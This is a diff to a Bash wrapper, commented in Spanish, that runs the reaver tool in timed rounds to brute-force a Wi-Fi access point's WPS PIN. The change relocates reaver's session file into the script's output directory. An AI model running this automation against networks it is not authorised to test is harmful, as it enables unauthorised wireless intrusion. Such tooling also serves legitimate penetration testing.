@@ -84,9 +84,9 @@ if [ -z "$SALIDA_DIR" ]; then
   SALIDA_DIR="$casa/capturas_wifi/reaver_${BSSID//[:]/_}"
 fi
 mkdir -p "$SALIDA_DIR" && chmod 700 "$SALIDA_DIR"
-[ -n "$SESION" ] || SESION="$SALIDA_DIR/sesion.wpc"
-# reaver guarda el progreso en ~/.reaver/<BSSID>.wpc; lo copiaremos a la sesión propia
-casa_reaver=$(getent passwd root | cut -d: -f6)
+# reaver guarda el progreso como <BSSID>.wps en su directorio de trabajo
+SESION_DEFAULT="$SALIDA_DIR/${BSSID}.wps"
+[ -n "$SESION" ] || SESION="$SESION_DEFAULT"
 INT=0
 trap 'INT=1' INT
 
@@ -111,14 +111,13 @@ while [ "$ronda" -le "$RONDAS_MAX" ]; do
   log="$SALIDA_DIR/ronda_$(printf '%03d' "$ronda").log"
   echo "[i] ronda $ronda/$RONDAS_MAX → $log"
   orden=("$REAVER" -i "$INTERFAZ" -b "$BSSID" -c "$CANAL" -g "$INTENTOS_RONDA" \
-         -d "$RETARDO" -l 120 -S)
-  # reaver guarda la sesión solo (~/.reaver/<BSSID>.wpc); si existe la nuestra, reanuda
+         -d "$RETARDO" -l 120)
+  # reaver reanuda con -s <BSSID>.wps; sin sesión previa, la creará en el cwd
   [ -f "$SESION" ] && orden+=(-s "$SESION")
   [ "$CANAL" -gt 14 ] && orden+=(-5)
-  timeout $(( INTENTOS_RONDA * (RETARDO + 120) + 300 )) "${orden[@]}" >"$log" 2>&1
-  # preservar el progreso de reaver (~/.reaver/<BSSID>.wpc) en nuestra sesión
-  [ -f "$casa_reaver/.reaver/${BSSID}.wpc" ] && \
-    cp -f "$casa_reaver/.reaver/${BSSID}.wpc" "$SESION" 2>/dev/null
+  timeout $(( INTENTOS_RONDA * (RETARDO + 120) + 300 )) bash -c \
+    'cd "$1" && shift && "$@"' _ "$SALIDA_DIR" "${orden[@]}" >"$log" 2>&1
+  # el progreso queda en SALIDA_DIR/<BSSID>.wps porque ejecutamos con ese cwd
   estado=$(analizar "$log")
   case "$estado" in
     ENCONTRADO)
